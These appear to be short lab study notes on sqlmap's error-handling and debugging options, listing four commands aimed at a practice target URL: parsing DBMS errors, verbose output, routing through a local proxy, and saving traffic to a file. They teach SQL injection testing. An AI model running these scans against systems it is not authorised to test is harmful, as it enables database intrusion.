# Handling Errors

## Parsed Messages

```sh
my@attack:~$ sudo sqlmap -u 'http://94.237.57.108:48194/case1.php?id=1' --parse-errors
```

## Verbose Output

```sh
my@attack:~$ sudo sqlmap -u 'http://94.237.57.108:48194/case1.php?id=1' -v 6
```

## Using Proxy

```sh
my@attack:~$ sudo sqlmap -u 'http://94.237.57.108:48194/case1.php?id=1' --proxy http://127.0.0.1:8080
```

## Storing the Traffic

```sh
my@attack:~$ sudo sqlmap -u 'http://94.237.57.108:48194/case1.php?id=1' -t traffic.txt
```
